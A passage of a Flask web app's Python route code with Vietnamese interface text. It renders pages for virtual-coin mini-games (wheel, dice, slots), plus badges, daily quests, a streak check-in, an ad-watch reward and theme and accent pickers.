                <div style="font-size:0.72em; color:var(--text-mute);">🎯 {r["plays"]} lượt · 💰 Tổng: {r["total_won"]} xu</div>
            </div>
            <div style="text-align:right;">
                <div style="font-family:var(--font-display); font-weight:900; color:#ffd700; font-size:1.1em;">{r["biggest_win"]}</div>
                <div style="font-size:0.65em; color:var(--text-mute);">thắng lớn nhất</div>
            </div>
        </div>'''
    if not rows: rows = '<p style="text-align:center; color:var(--text-dim); padding:20px;">Chưa ai chơi game</p>'
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(255,183,3,0.2),rgba(255,0,127,0.15)); border:2px solid #ffb800;">
        <div style="font-size:3.5em;">🏆</div>
        <h2 class="card-title" style="justify-content:center; color:#ffb800; font-size:1.4em;">{t("bxh_title")}</h2>
    </div>
    <div class="card">
        <div style="display:flex; gap:8px; margin-bottom:14px;">
            <a href="/game" class="btn btn-secondary btn-sm">← {t("game_hub")}</a>
        </div>
        {rows}
    </div>'''
    return render_page(content, active_tab="game", user=user)

@app.route("/game/vongquay", methods=["GET", "POST"])
@login_required
def game_vongquay():
    user = get_user()
    _reset_game_daily_if_needed(user)
    result = None
    if request.method == "POST":
        result = play_vongquay(user)
    gd = user.get("game_daily", {})
    played = gd.get("vongquay", 0)
    cfg = GAME_CONFIGS["vongquay"]
    result_html = ""
    if result:
        if result.get("success"):
            win = result.get("win", 0)
            result_html = f'''<div class="card" style="text-align:center; border:2px solid {"#00ff88" if win > 0 else "#ff2951"};">
                <div style="font-size:4em;">{"🎉" if win > 0 else "😢"}</div>
                <div style="font-family:var(--font-display); font-size:2em; font-weight:900; color:{"#00ff88" if win > 0 else "#ff2951"};">{win} XU</div>
                <div style="font-family:var(--font-mono); color:#94a3b8; margin-top:8px;">{result.get("message","")}</div></div>'''
        else:
            result_html = f'<div class="flash error">⚠️ {result.get("error","")}</div>'
    content = f'''
    {result_html}
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(255,183,3,0.15),rgba(255,136,0,0.1)); border:2px solid #ffb800;">
        <div style="font-size:4em;">🎰</div>
        <h2 class="card-title" style="justify-content:center; color:#ffb800; font-size:1.3em;">{t("g1_name")}</h2>
        <p style="color:var(--text-dim); margin:8px 0;">{t("g1_desc")}</p>
        <div style="font-family:var(--font-display); font-weight:800; margin:14px 0;">💰 {t("game_balance")}: <span style="color:#ffd700;">{user.get("balance", 0)}</span> xu</div>
        <div style="font-family:var(--font-display); font-size:0.85em; color:{"#ff2951" if played >= cfg["max_daily"] else "#00ff88"}; margin-bottom:14px;">
            🎯 {t("game_plays_today")}: <b>{played}/{cfg["max_daily"]}</b></div>
        <form method="POST">
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000; font-size:1.1em; padding:16px;" {'disabled' if played >= cfg["max_daily"] or user.get("balance",0) < cfg["cost"] else ''}>
                {t("g1_btn")} ({cfg["cost"]} xu)</button>
        </form>
    </div>
    <div class="card" style="text-align:center;"><a href="/game" class="btn btn-secondary btn-block">← {t("game_hub")}</a></div>'''
    return render_page(content, active_tab="game", user=user)

@app.route("/game/taixiu", methods=["GET", "POST"])
@login_required
def game_taixiu():
    user = get_user()
    _reset_game_daily_if_needed(user)
    result = None
    if request.method == "POST":
        bet = request.form.get("bet", "0")
        choice = request.form.get("choice", "")
        result = play_taixiu(user, bet, choice)
    gd = user.get("game_daily", {})
    played = gd.get("taixiu", 0)
    cfg = GAME_CONFIGS["taixiu"]
    result_html = ""
    if result:
        if result.get("success"):
            win = result.get("win", 0); bet = result.get("bet", 0)
            dice = result.get("dice", [0,0,0]); total = result.get("total", 0)
            is_win = win > bet
            emoji = "🎉" if is_win else ("😐" if win == bet else "😢")
            dice_html = " ".join([f'<span style="font-size:2.5em;">{["","⚀","⚁","⚂","⚃","⚄","⚅"][d] if 1<=d<=6 else "🎲"}</span>' for d in dice])
            result_html = f'''<div class="card" style="text-align:center; border:2px solid {"#00ff88" if is_win else ("#ffb800" if win == bet else "#ff2951")};">
                <div style="font-size:3.5em;">{emoji}</div>
                <div style="margin:10px 0;">{dice_html}</div>
                <div style="font-family:var(--font-display); font-size:1.3em; font-weight:800; color:#ffd700;">Tổng: {total} — {result.get("result","").upper()}</div>
                <div style="font-family:var(--font-display); font-size:1.8em; font-weight:900; color:{"#00ff88" if is_win else ("#ffb800" if win == bet else "#ff2951")}; margin-top:10px;">{win} XU</div>
                <div style="font-family:var(--font-mono); color:#94a3b8; margin-top:8px; font-size:0.85em;">{result.get("message","")}</div></div>'''
        else:
            result_html = f'<div class="flash error">⚠️ {result.get("error","")}</div>'
    content = f'''
    {result_html}
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(0,242,254,0.15),rgba(0,165,255,0.1)); border:2px solid #00f2fe;">
        <div style="font-size:4em;">🎲</div>
        <h2 class="card-title" style="justify-content:center; color:#00f2fe; font-size:1.3em;">{t("g2_name")}</h2>
        <p style="color:var(--text-dim); margin:8px 0;">{t("g2_desc")}</p>
        <div style="font-family:var(--font-display); font-weight:800; margin:14px 0;">💰 {t("game_balance")}: <span style="color:#ffd700;">{user.get("balance", 0)}</span> xu</div>
        <div style="font-family:var(--font-display); font-size:0.85em; color:{"#ff2951" if played >= cfg["max_daily"] else "#00ff88"}; margin-bottom:14px;">
            🎯 {t("game_plays_today")}: <b>{played}/{cfg["max_daily"]}</b></div>
        <form method="POST">
            <div class="form-group"><label class="form-label">{t("g2_bet")}</label>
                <input type="number" name="bet" class="form-input" value="10" min="5" max="100" required></div>
            <div class="form-group"><label class="form-label">{t("g2_choice")}</label>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                    <label class="menu-btn" style="padding:12px; cursor:pointer;">
                        <input type="radio" name="choice" value="tai" required style="display:none;">
                        <div class="menu-icon">🔺</div><div class="menu-label">{t("g2_tai")}</div></label>
                    <label class="menu-btn" style="padding:12px; cursor:pointer;">
                        <input type="radio" name="choice" value="xiu" required style="display:none;">
                        <div class="menu-icon">🔻</div><div class="menu-label">{t("g2_xiu")}</div></label>
                </div></div>
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#00f2fe,#00a5ff); color:#000; font-size:1.1em; padding:16px;" {'disabled' if played >= cfg["max_daily"] else ''}>
                {t("g2_btn")}</button>
        </form>
    </div>
    <div class="card" style="text-align:center;"><a href="/game" class="btn btn-secondary btn-block">← {t("game_hub")}</a></div>'''
    return render_page(content, active_tab="game", user=user)

@app.route("/game/daphop", methods=["GET", "POST"])
@login_required
def game_daphop():
    user = get_user()
    _reset_game_daily_if_needed(user)
    result = None
    if request.method == "POST": result = play_daphop(user)
    gd = user.get("game_daily", {})
    played = gd.get("daphop", 0)
    cfg = GAME_CONFIGS["daphop"]
    result_html = ""
    if result:
        if result.get("success"):
            win = result.get("win", 0)
            result_html = f'''<div class="card" style="text-align:center; border:2px solid {"#00ff88" if win > 0 else "#ff2951"};">
                <div style="font-size:4em;">{"🎉" if win > 0 else "😢"}</div>
                <div style="font-family:var(--font-display); font-size:2em; font-weight:900; color:{"#00ff88" if win > 0 else "#ff2951"};">{win} XU</div>
                <div style="font-family:var(--font-mono); color:#94a3b8; margin-top:8px;">{result.get("message","")}</div></div>'''
        else:
            result_html = f'<div class="flash error">⚠️ {result.get("error","")}</div>'
    content = f'''
    {result_html}
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(224,64,251,0.15),rgba(168,85,247,0.1)); border:2px solid #e040fb;">
        <div style="font-size:4em;">📦</div>
        <h2 class="card-title" style="justify-content:center; color:#e040fb; font-size:1.3em;">{t("g3_name")}</h2>
        <p style="color:var(--text-dim); margin:8px 0;">{t("g3_desc")}</p>
        <div style="font-family:var(--font-display); font-weight:800; margin:14px 0;">💰 {t("game_balance")}: <span style="color:#ffd700;">{user.get("balance", 0)}</span> xu</div>
        <div style="font-family:var(--font-display); font-size:0.85em; color:{"#ff2951" if played >= cfg["max_daily"] else "#00ff88"}; margin-bottom:14px;">
            🎯 {t("game_plays_today")}: <b>{played}/{cfg["max_daily"]}</b></div>
        <form method="POST">
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#e040fb,#a855f7); color:#fff; font-size:1.1em; padding:16px;" {'disabled' if played >= cfg["max_daily"] or user.get("balance",0) < cfg["cost"] else ''}>
                {t("g3_btn")} ({cfg["cost"]} xu)</button>
        </form>
    </div>
    <div class="card" style="text-align:center;"><a href="/game" class="btn btn-secondary btn-block">← {t("game_hub")}</a></div>'''
    return render_page(content, active_tab="game", user=user)

@app.route("/game/lixi", methods=["GET", "POST"])
@login_required
def game_lixi():
    user = get_user()
    _reset_game_daily_if_needed(user)
    result = None
    if request.method == "POST": result = play_lixi(user)
    gd = user.get("game_daily", {})
    played = gd.get("lixi", 0)
    cfg = GAME_CONFIGS["lixi"]
    result_html = ""
    if result:
        if result.get("success"):
            win = result.get("win", 0)
            result_html = f'''<div class="card" style="text-align:center; border:2px solid #00ff88;">
                <div style="font-size:4em;">🧧</div>
                <div style="font-family:var(--font-display); font-size:2em; font-weight:900; color:#00ff88;">+{win} XU</div>
                <div style="font-family:var(--font-mono); color:#94a3b8; margin-top:8px;">{result.get("message","")}</div></div>'''
        else:
            result_html = f'<div class="flash error">⚠️ {result.get("error","")}</div>'
    content = f'''
    {result_html}
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(0,255,136,0.15),rgba(0,212,170,0.1)); border:2px solid #00ff88;">
        <div style="font-size:4em;">🎁</div>
        <h2 class="card-title" style="justify-content:center; color:#00ff88; font-size:1.3em;">{t("g4_name")}</h2>
        <p style="color:var(--text-dim); margin:8px 0;">{t("g4_desc")}</p>
        <div style="font-family:var(--font-display); font-weight:800; margin:14px 0;">💰 {t("game_balance")}: <span style="color:#ffd700;">{user.get("balance", 0)}</span> xu</div>
        <div style="font-family:var(--font-display); font-size:0.85em; color:{"#ff2951" if played >= cfg["max_daily"] else "#00ff88"}; margin-bottom:14px;">
            🎯 {t("game_plays_today")}: <b>{played}/{cfg["max_daily"]}</b></div>
        <form method="POST">
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#00ff88,#00d4aa); color:#000; font-size:1.1em; padding:16px;" {'disabled' if played >= cfg["max_daily"] else ''}>
                {t("g4_btn")} — FREE</button>
        </form>
    </div>
    <div class="card" style="text-align:center;"><a href="/game" class="btn btn-secondary btn-block">← {t("game_hub")}</a></div>'''
    return render_page(content, active_tab="game", user=user)

@app.route("/game/rongvang", methods=["GET", "POST"])
@login_required
def game_rongvang():
    user = get_user()
    _reset_game_daily_if_needed(user)
    result = None
    if request.method == "POST":
        bet = request.form.get("bet", "50")
        result = play_rongvang(user, bet)
    gd = user.get("game_daily", {})
    played = gd.get("rongvang", 0)
    cfg = GAME_CONFIGS["rongvang"]
    result_html = ""
    if result:
        if result.get("success"):
            is_win = result.get("is_win", False)
            win = result.get("win", 0)
            result_html = f'''<div class="card" style="text-align:center; border:2px solid {"#ffd700" if is_win else "#ff2951"};">
                <div style="font-size:4em;">{"🐉✨" if is_win else "🐉"}</div>
                <div style="font-family:var(--font-display); font-size:2em; font-weight:900; color:{"#ffd700" if is_win else "#ff2951"};">{win} XU</div>
                <div style="font-family:var(--font-mono); color:#94a3b8; margin-top:8px;">{result.get("message","")}</div></div>'''
        else:
            result_html = f'<div class="flash error">⚠️ {result.get("error","")}</div>'
    content = f'''
    {result_html}
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(255,215,0,0.15),rgba(255,41,81,0.1)); border:2px solid #ffd700;">
        <div style="font-size:4em;">🐉</div>
        <h2 class="card-title" style="justify-content:center; color:#ffd700; font-size:1.3em;">{t("g5_name")}</h2>
        <p style="color:var(--text-dim); margin:8px 0;">{t("g5_desc")}</p>
        <div style="font-family:var(--font-display); font-weight:800; margin:14px 0;">💰 {t("game_balance")}: <span style="color:#ffd700;">{user.get("balance", 0)}</span> xu</div>
        <div style="font-family:var(--font-display); font-size:0.85em; color:{"#ff2951" if played >= cfg["max_daily"] else "#00ff88"}; margin-bottom:14px;">
            🎯 {t("game_plays_today")}: <b>{played}/{cfg["max_daily"]}</b></div>
        <form method="POST">
            <div class="form-group"><label class="form-label">{t("g5_bet")}</label>
                <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px;">
                    <label class="menu-btn" style="padding:14px 6px; cursor:pointer;">
                        <input type="radio" name="bet" value="50" required style="display:none;">
                        <div class="menu-icon">🥉</div><div class="menu-label">50 xu<br>(5% x10)</div></label>
                    <label class="menu-btn" style="padding:14px 6px; cursor:pointer;">
                        <input type="radio" name="bet" value="100" required style="display:none;">
                        <div class="menu-icon">🥈</div><div class="menu-label">100 xu<br>(10% x10)</div></label>
                    <label class="menu-btn" style="padding:14px 6px; cursor:pointer;">
                        <input type="radio" name="bet" value="200" required style="display:none;">
                        <div class="menu-icon">🥇</div><div class="menu-label">200 xu<br>(20% x10)</div></label>
                </div></div>
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#ffd700,#ff8800); color:#000; font-size:1.1em; padding:16px;" {'disabled' if played >= cfg["max_daily"] else ''}>
                {t("g5_btn")}</button>
        </form>
    </div>
    <div class="card" style="text-align:center;"><a href="/game" class="btn btn-secondary btn-block">← {t("game_hub")}</a></div>'''
    return render_page(content, active_tab="game", user=user)

# 🆕 v7.0: SLOT MACHINE (#13)
@app.route("/game/slot", methods=["GET", "POST"])
@login_required
def game_slot():
    user = get_user()
    _reset_game_daily_if_needed(user)
    result = None
    if request.method == "POST":
        bet = request.form.get("bet", "10")
        result = play_slot(user, bet)
    gd = user.get("game_daily", {})
    played = gd.get("slot", 0)
    cfg = GAME_CONFIGS["slot"]
    sstats = user.get("slot_stats", {"plays": 0, "biggest_win": 0})
    result_html = ""
    if result:
        if result.get("success"):
            win = result.get("win", 0); bet = result.get("bet", 0)
            reels = result.get("reels", ["❓","❓","❓"])
            is_win = win > bet
            emoji = "🎉" if is_win else ("😐" if win == bet else "😢")
            reels_html = "".join([f'<div class="slot-reel">{r}</div>' for r in reels])
            result_html = f'''<div class="card" style="text-align:center; border:2px solid {"#00ff88" if is_win else ("#ffb800" if win == bet else "#ff2951")};">
                <div style="font-size:3.5em;">{emoji}</div>
                <div class="slot-reels">{reels_html}</div>
                <div style="font-family:var(--font-display); font-size:1.8em; font-weight:900; color:{"#00ff88" if is_win else ("#ffb800" if win == bet else "#ff2951")};">{win} XU</div>
                <div style="font-family:var(--font-mono); color:#94a3b8; margin-top:8px; font-size:0.85em;">{result.get("message","")}</div></div>'''
        else:
            result_html = f'<div class="flash error">⚠️ {result.get("error","")}</div>'
    content = f'''
    {result_html}
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(255,0,127,0.15),rgba(255,183,3,0.1)); border:2px solid #ff007f;">
        <div style="font-size:4em;">🎰</div>
        <h2 class="card-title" style="justify-content:center; color:#ff007f; font-size:1.3em;">{t("g6_name")}</h2>
        <p style="color:var(--text-dim); margin:8px 0;">{t("g6_desc")}</p>
        <div style="font-family:var(--font-display); font-weight:800; margin:14px 0;">💰 {t("game_balance")}: <span style="color:#ffd700;">{user.get("balance", 0)}</span> xu</div>
        <div style="font-family:var(--font-display); font-size:0.85em; color:{"#ff2951" if played >= cfg["max_daily"] else "#00ff88"}; margin-bottom:14px;">
            🎯 {t("game_plays_today")}: <b>{played}/{cfg["max_daily"]}</b></div>
        <div style="display:flex; gap:8px; justify-content:center; margin-bottom:14px; flex-wrap:wrap;">
            <span style="padding:4px 10px; background:rgba(0,242,254,0.15); border-radius:8px; font-size:0.75em;">🎯 {sstats.get("plays",0)} lượt</span>
            <span style="padding:4px 10px; background:rgba(255,215,0,0.15); border-radius:8px; font-size:0.75em;">🏆 Max: {sstats.get("biggest_win",0)} xu</span>
        </div>
        <form method="POST">
            <div class="form-group"><label class="form-label">Số xu cược (10-100)</label>
                <input type="number" name="bet" class="form-input" value="10" min="10" max="100" required></div>
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#ff007f,#ff5500); color:#fff; font-size:1.1em; padding:16px;" {'disabled' if played >= cfg["max_daily"] else ''}>
                {t("g6_btn")}</button>
        </form>
    </div>
    <div class="card" style="text-align:center;"><a href="/game" class="btn btn-secondary btn-block">← {t("game_hub")}</a></div>'''
    return render_page(content, active_tab="game", user=user)

# ═══════════════════════════════════════════════════════════════════
#  🆕 v7.0: BADGES PAGE (#15)
# ═══════════════════════════════════════════════════════════════════
@app.route("/badges")
@login_required
def badges_page():
    user = get_user()
    check_badge_conditions(user)
    earned = set(user.get("badges", []))
    items = ""
    for bid, bd in BADGE_DEFS.items():
        is_earned = bid in earned
        cls = "earned" if is_earned else "locked"
        status = f'<div style="color:#ffb800; font-weight:700; font-size:0.75em; margin-top:6px;">✓ {t("badge_earned")}</div>' if is_earned else f'<div style="color:#64748b; font-size:0.75em; margin-top:6px;">🔒 {t("badge_locked")}</div>'
        items += f'''<div class="badge-item {cls}">
            <div class="badge-icon">{bd["icon"]}</div>
            <div class="badge-name">{bd["name_vi"]}</div>
            <div class="badge-desc">{bd["desc_vi"]}</div>
            {status}
        </div>'''
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(255,183,3,0.15),rgba(255,0,127,0.1)); border:2px solid #ffb800;">
        <div style="font-size:3.5em;">🏅</div>
        <h2 class="card-title" style="justify-content:center; color:#ffb800; font-size:1.4em;">{t("badge_title")}</h2>
        <div style="font-family:var(--font-display); color:#ffd700; font-weight:800; margin-top:8px;">{len(earned)}/{len(BADGE_DEFS)} đã đạt</div>
    </div>
    <div class="card">
        <div class="badge-grid">{items}</div>
    </div>
    <div class="card" style="text-align:center;"><a href="/profile" class="btn btn-secondary btn-block">← {t("btn_back")}</a></div>'''
    return render_page(content, active_tab="profile", user=user)

# ═══════════════════════════════════════════════════════════════════
#  🆕 v7.0: DAILY QUEST (#32)
# ═══════════════════════════════════════════════════════════════════
@app.route("/quests")
@login_required
def quests_page():
    user = get_user()
    _reset_daily_quests(user)
    dq = user["daily_quests"]
    items = ""
    for qid, q in dq["quests"].items():
        qdef = dq["defs"].get(qid, {})
        pct = int((q["progress"] / q["target"]) * 100) if q["target"] > 0 else 0
        done = q["progress"] >= q["target"]
        claimed = q["claimed"]
        cls = "done" if (done or claimed) else ""
        if claimed:
            btn_html = f'<div style="color:#00ff88; font-weight:800; font-family:var(--font-display); font-size:0.85em;">✓ {t("quest_claimed")}</div>'
        elif done:
            btn_html = f'<button onclick="claimQuest(\'{qid}\')" class="btn btn-success btn-sm">🎁 {t("quest_claim")} +{q["reward"]} xu</button>'
        else:
            btn_html = f'<div style="color:#64748b; font-family:var(--font-display); font-size:0.8em;">{t("quest_incomplete")}</div>'
        items += f'''<div class="quest-item {cls}">
            <div class="quest-header">
                <div class="quest-name">{qdef.get("name", qid)}</div>
                <div style="color:#ffd700; font-weight:800; font-family:var(--font-display); font-size:0.85em;">+{q["reward"]} xu</div>
            </div>
            <div class="quest-progress-bar"><div class="quest-progress-fill" style="width:{pct}%;"></div></div>
            <div style="display:flex; justify-content:space-between; align-items:center; gap:8px;">
                <div style="color:var(--text-dim); font-size:0.8em;">📊 {t("quest_progress")}: {q["progress"]}/{q["target"]}</div>
                {btn_html}
            </div>
        </div>'''
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(0,242,254,0.15),rgba(0,255,136,0.1)); border:2px solid #00f2fe;">
        <div style="font-size:3.5em;">📋</div>
        <h2 class="card-title" style="justify-content:center; color:#00f2fe; font-size:1.4em;">{t("quest_title")}</h2>
        <div style="font-family:var(--font-display); color:#94a3b8; font-weight:800; margin-top:8px;">📅 {dq["date"]}</div>
    </div>
    <div class="card">{items}</div>
    <div class="card" style="text-align:center;"><a href="/profile" class="btn btn-secondary btn-block">← {t("btn_back")}</a></div>
    <script>
    function claimQuest(qid) {{
        fetch('/api/quest/claim/' + qid, {{method:'POST'}}).then(r=>r.json()).then(d => {{
            if (d.success) {{ showToast('🎉 +' + d.reward + ' xu!'); setTimeout(()=>location.reload(), 800); }}
            else {{ showToast('⚠️ ' + (d.error || 'Lỗi')); }}
        }});
    }}
    </script>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/api/quest/claim/<quest_id>", methods=["POST"])
@login_required
def api_quest_claim(quest_id):
    user = get_user()
    ok, result = quest_claim(user, quest_id)
    if ok:
        save_data()
        check_badge_conditions(user)
        return jsonify({"success": True, "reward": result})
    return jsonify({"success": False, "error": result})

# ═══════════════════════════════════════════════════════════════════
#  🆕 v7.0: STREAK CHECK-IN (#11)
# ═══════════════════════════════════════════════════════════════════
@app.route("/streak", methods=["GET", "POST"])
@login_required
def streak_page():
    user = get_user()
    result_html = ""
    if request.method == "POST":
        ok, msg, reward = do_streak_checkin(user)
        if ok:
            save_data()
            check_badge_conditions(user)
            result_html = f'''<div class="card" style="text-align:center; border:2px solid #00ff88; background:linear-gradient(135deg,rgba(0,255,136,0.15),rgba(255,183,3,0.1));">
                <div style="font-size:4em;">🎉</div>
                <div style="font-family:var(--font-display); font-size:1.5em; font-weight:900; color:#00ff88;">+{reward} XU</div>
                <div style="font-family:var(--font-mono); color:#94a3b8; margin-top:8px;">{msg}</div></div>'''
        else:
            result_html = f'<div class="flash error">⚠️ {msg}</div>'
    sd = user.get("streak_data", {"current": 0, "last": 0, "best": 0})
    today = datetime.now().strftime("%Y-%m-%d")
    last_date = datetime.fromtimestamp(sd.get("last", 0)).strftime("%Y-%m-%d") if sd.get("last") else ""
    checked_today = (last_date == today)
    days_html = ""
    for i in range(7):
        done = i < sd.get("current", 0)
        is_current = i == sd.get("current", 0) and not checked_today
        cls = "done" if done else ("current" if is_current else "")
        icon = "✓" if done else ("🎯" if is_current else "○")
        days_html += f'''<div class="streak-day {cls}">
            <div class="icon">{icon}</div>
            <div style="font-weight:700;">N{i+1}</div>
            <div class="reward">+{STREAK_REWARDS[i]}</div>
        </div>'''
    btn_html = f'''<button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000; font-size:1.1em; padding:16px;" {'disabled' if checked_today else ''}>
        📅 {t("streak_done") if checked_today else t("streak_today") + " +" + str(STREAK_REWARDS[min(sd.get("current",0), 6)]) + " xu"}
    </button>'''
    content = f'''
    {result_html}
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(255,183,3,0.15),rgba(255,0,127,0.1)); border:2px solid #ffb800;">
        <div style="font-size:3.5em;">📅</div>
        <h2 class="card-title" style="justify-content:center; color:#ffb800; font-size:1.4em;">{t("streak_title")}</h2>
    </div>
    <div class="card">
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value" style="color:#00ff88;">{sd.get("current",0)}</div><div class="stat-label">{t("streak_current")}</div></div>
            <div class="stat-box"><div class="stat-value" style="color:#ffd700;">{sd.get("best",0)}</div><div class="stat-label">{t("streak_best")}</div></div>
        </div>
        <div class="streak-grid">{days_html}</div>
        <form method="POST">{btn_html}</form>
    </div>
    <div class="card" style="text-align:center;"><a href="/profile" class="btn btn-secondary btn-block">← {t("btn_back")}</a></div>'''
    return render_page(content, active_tab="profile", user=user)

# ═══════════════════════════════════════════════════════════════════
#  🆕 v7.0: AD REWARD (#31)
# ═══════════════════════════════════════════════════════════════════
@app.route("/ad")
@login_required
def ad_page():
    user = get_user()
    today = datetime.now().strftime("%Y-%m-%d")
    aw = user.get("ad_watches", {})
    if aw.get("date") != today: aw = {"date": today, "count": 0}
    used = aw.get("count", 0)
    remaining = max(0, 10 - used)
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(0,242,254,0.15),rgba(0,255,136,0.1)); border:2px solid #00f2fe;">
        <div style="font-size:3.5em;">📺</div>
        <h2 class="card-title" style="justify-content:center; color:#00f2fe; font-size:1.4em;">{t("ad_title")}</h2>
        <p style="color:var(--text-dim); margin-top:8px;">Xem quảng cáo 5s → nhận 5-15 xu</p>
    </div>
    <div class="card">
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value" style="color:#00ff88;">{remaining}/10</div><div class="stat-label">Lượt còn lại</div></div>
            <div class="stat-box"><div class="stat-value" style="color:#ffd700;">{user.get("balance",0)}</div><div class="stat-label">Số dư</div></div>
        </div>
        <div style="margin-top:14px;">
            <button id="btn-watch" onclick="startWatch()" class="btn btn-block" style="background:linear-gradient(135deg,#00f2fe,#00ff88); color:#000; font-size:1.1em; padding:16px;" {'disabled' if remaining <= 0 else ''}>
                {t("ad_watch")}
            </button>
        </div>
    </div>
    <div class="card" style="text-align:center;"><a href="/profile" class="btn btn-secondary btn-block">← {t("btn_back")}</a></div>
    <div id="ad-modal" class="ad-overlay" style="display:none;">
        <div style="font-family:var(--font-display); font-size:1.5em; color:#fff;">📺 ĐANG XEM QUẢNG CÁO...</div>
        <div class="ad-countdown" id="ad-timer">5</div>
        <div style="color:#94a3b8;">Vui lòng đợi để nhận thưởng</div>
    </div>
    <script>
    function startWatch() {{
        var modal = document.getElementById('ad-modal');
        var timer = document.getElementById('ad-timer');
        modal.style.display = 'flex';
        var t = 5; timer.textContent = t;
        var iv = setInterval(function() {{
            t--; timer.textContent = t;
            if (t <= 0) {{
                clearInterval(iv);
                fetch('/api/ad/watch', {{method:'POST'}}).then(r=>r.json()).then(d => {{
                    modal.style.display = 'none';
                    if (d.success) {{ showToast('🎉 +' + d.reward + ' xu!'); setTimeout(()=>location.reload(), 1000); }}
                    else {{ showToast('⚠️ ' + (d.error || 'Lỗi')); }}
                }});
            }}
        }}, 1000);
    }}
    </script>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/api/ad/watch", methods=["POST"])
@login_required
def api_ad_watch():
    user = get_user()
    result = watch_ad(user)
    return jsonify(result)

# ═══════════════════════════════════════════════════════════════════
#  🆕 v7.0: ACCENT COLOR (#28)
# ═══════════════════════════════════════════════════════════════════
@app.route("/accent")
@login_required
def accent_page():
    user = get_user()
    current = user.get("accent", "cyan")
    items = ""
    for aid, acfg in ACCENT_COLORS.items():
        active = "active" if aid == current else ""
        items += f'''<div class="theme-item {active}" onclick="setAccent('{aid}')" style="background:{acfg['hex']};">
            <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#000; font-weight:900; font-size:2em; text-shadow:0 0 10px rgba(0,0,0,0.3);">●</div>
            <div class="theme-label">{acfg["name_vi"]}</div>
        </div>'''
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(0,242,254,0.15),rgba(255,0,127,0.1)); border:2px solid var(--accent);">
        <div style="font-size:3.5em;">🎨</div>
        <h2 class="card-title" style="justify-content:center; color:var(--accent); font-size:1.4em;">{t("accent_title")}</h2>
    </div>
    <div class="card">
        <div class="theme-picker-grid">{items}</div>
    </div>
    <div class="card" style="text-align:center;"><a href="/profile" class="btn btn-secondary btn-block">← {t("btn_back")}</a></div>
    <script>
    function setAccent(aid) {{
        fetch('/api/set_accent/' + aid, {{method:'POST'}}).then(r=>r.json()).then(d => {{
            if (d.success) {{ document.body.setAttribute('data-accent', aid); showToast('✓ Đã đổi màu!'); setTimeout(()=>location.reload(), 600); }}
        }});
    }}
    </script>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/api/set_accent/<accent_id>", methods=["POST"])
@login_required
def api_set_accent(accent_id):
    if accent_id not in ACCENT_COLORS: return jsonify({"success": False, "error": "Màu không hợp lệ"})
    set_accent(accent_id)
    return jsonify({"success": True, "accent": accent_id})

# ═══════════════════════════════════════════════════════════════════
#  🎨 THEME PICKER
# ═══════════════════════════════════════════════════════════════════
@app.route("/theme")
@login_required
def theme_picker():
    user = get_user()
    current = user.get("background", "grid")
    items = ""
    for tid, tinfo in THEMES.items():
        active = "active" if tid == current else ""
        lang = get_lang()
        name = tinfo.get(f"name_{lang}", tinfo["name_vi"])
        items += f'''<div class="theme-item {active}" onclick="setBg('{tid}')" title="{name}">
            <div class="theme-preview {tinfo['css_class']}" style="background-size:cover;"></div>
            <div class="theme-label">{name}</div></div>'''
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(0,242,254,0.15),rgba(255,0,127,0.1)); border:2px solid #00f2fe;">
        <div style="font-size:3.5em;">🎨</div>
        <h2 class="card-title" style="justify-content:center; color:#00f2fe; font-size:1.4em;">{t("theme_picker")}</h2>
        <p style="color:var(--text-dim); margin-top:8px;">{len(THEMES)} phông nền Việt Nam đẹp</p>
    </div>
    <div class="card">
        <div class="theme-picker-grid">{items}</div>
    </div>
    <div class="card" style="text-align:center;">
        <a href="/accent" class="btn btn-info btn-block" style="margin-bottom:8px;">🎨 {t("accent_title")}</a>
        <a href="/profile" class="btn btn-secondary btn-block">← {t("btn_back")}</a>
    </div>
    <script>
    function setBg(bgId) {{
        fetch('/api/set_bg/' + bgId, {{ method: 'POST' }})
        .then(r => r.json()).then(d => {{
            if (d.success) {{
                document.querySelectorAll('.theme-item').forEach(el => el.classList.remove('active'));
                event.currentTarget.classList.add('active');
                document.body.className = 'theme-' + bgId;
                document.body.setAttribute('data-accent', document.body.getAttribute('data-accent') || 'cyan');
                showToast('✓ ' + (d.name || 'Đã đổi nền'));
            }} else {{ showToast('⚠️ Lỗi!'); }}
        }});
    }}
    </script>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/api/set_bg/<bg_id>", methods=["POST"])
@login_required
def api_set_bg(bg_id):
    if bg_id not in THEMES: return jsonify({"success": False, "error": "Nền không tồn tại"})
    set_background(bg_id)
    return jsonify({"success": True, "bg": bg_id, "name": THEMES[bg_id]["name_vi"]})

@app.route("/api/set_lang/<lang>", methods=["POST"])
@login_required
def api_set_lang(lang):
    if lang not in TRANSLATIONS: return jsonify({"success": False, "error": "Ngôn ngữ không hỗ trợ"})
    set_lang(lang)
